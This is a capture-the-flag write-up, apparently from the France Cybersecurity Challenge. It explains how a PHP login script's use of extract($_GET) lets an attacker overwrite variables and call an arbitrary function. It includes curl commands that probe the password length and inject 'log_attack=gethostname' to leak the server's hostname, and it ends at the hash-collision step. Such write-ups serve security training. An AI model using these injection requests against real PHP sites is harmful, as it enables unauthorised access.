# Salty Authentication
<img alt="Challenge" src="challenge.png" width=300>

When trying to access the given url, we get the following answer:
```php
<?php

error_reporting(0);

include('flag.php');
$salt = bin2hex(random_bytes(12));

extract($_GET);

$secret = gethostname() . $salt;

if (isset($password) && strlen($password) === strlen($secret) && $password !== $secret) {
    if (hash('fnv164', $password) == hash('fnv164', $secret)) {
        exit(htmlentities($flag));
    } else {
        echo('Wrong password!');
        exit($log_attack());
    }
}

highlight_file(__FILE__);

?>
```

The secret string is composed of the hostname of the machine concatenated with a random salt.
The script checks if the "password" parameter was provided in the GET request and if it has the same length as the secret string. If these conditions are met, the hash function "fnv164" is applied to the secret string and the "password" parameter, and the two hashes are compared.

Let's read the php doc of the extract function:
<div class="refnamediv">
  <h1 class="refname">extract</h1>
  <p class="verinfo">(PHP 4, PHP 5, PHP 7, PHP 8)</p><p class="refpurpose"><span class="refname">extract</span> — <span class="dc-title">Import variables into the current symbol table from an array</span></p>
</div>
<div class="refsect1 description" id="refsect1-function.extract-description">
  <h3 class="title">Description<a class="genanchor" href="#refsect1-function.extract-description"> ¶</a></h3>
  <div class="methodsynopsis dc-description">
   <span class="methodname"><strong>extract</strong></span>(<span class="methodparam"><span class="type">array</span> <code class="parameter reference">&amp;$array</code></span>, <span class="methodparam"><span class="type">int</span> <code class="parameter">$flags</code><span class="initializer"> = <strong><code>EXTR_OVERWRITE</code></strong></span></span>, <span class="methodparam"><span class="type">string</span> <code class="parameter">$prefix</code><span class="initializer"> = ""</span></span>): <span class="type">int</span></div>

  <p class="para rdfs-comment">
   Import variables from an array into the current symbol table.
  </p>
  <p class="para">
   Checks each key to see whether it has a valid variable name. 
   It also checks for collisions with existing variables in
   the symbol table.
  </p>
  <div class="warning"><strong class="warning">Warning</strong>
   <p class="para">
    Do not use <span class="function"><strong>extract()</strong></span> on untrusted data, like user input
    (e.g. <var class="varname"><a href="reserved.variables.get.php" class="classname">$_GET</a></var>, <var class="varname"><a href="reserved.variables.files.php" class="classname">$_FILES</a></var>).
   </p>
  </div>
 </div>

With this function we can control a number of variables in the script.
This allows us to submit, via a GET request, the $password and $salt parameters.
First, we will try to know the length of the hostname returned by the gethostname() function. To do so, we just have to submit an empty $salt, and iterate on the length of $password until the message 'Wrong password!

```console
dqrkk$ for i in {1..100}; do response=$(curl -s "https://salty-authentication.france-cybersecurity-challenge.fr/?salt=&password=$(python -c 'print "A" * '$i'')") && [[ "$response" == *"Wrong password"* ]] && echo "Password length: $i"; sleep 2; done
Password length: 12
```

The hostname has a length of 12 characters.
In order to go further, we need to know the value of the hostname.
For that, we will use a flaw in the script.
Indeed, when the hashes don't match, the script displays the message "Wrong password!", but it also makes an exit($log_attack()).
This gives us the possibility to call a function by controlling the value of $log_attack.
We will send the string gethostname in the parameter, in order to make the script execute this function.

```console
dqrkk$ curl "https://salty-authentication.france-cybersecurity-challenge.fr/?salt=&password=AAAAAAAAAAAA&log_attack=gethostname"; echo     
Wrong password!9be4a60f645f
```

Hostname is 9be4a60f645f

At this point, all we have to do is find a $password and a $salt that will satisfy the following conditions:

```php
$secret = "9be4a60f645f" . $salt

strlen($password) === strlen($secret)
$password !== $secret
hash('fnv164', $password) == hash('fnv164', $secret)
```


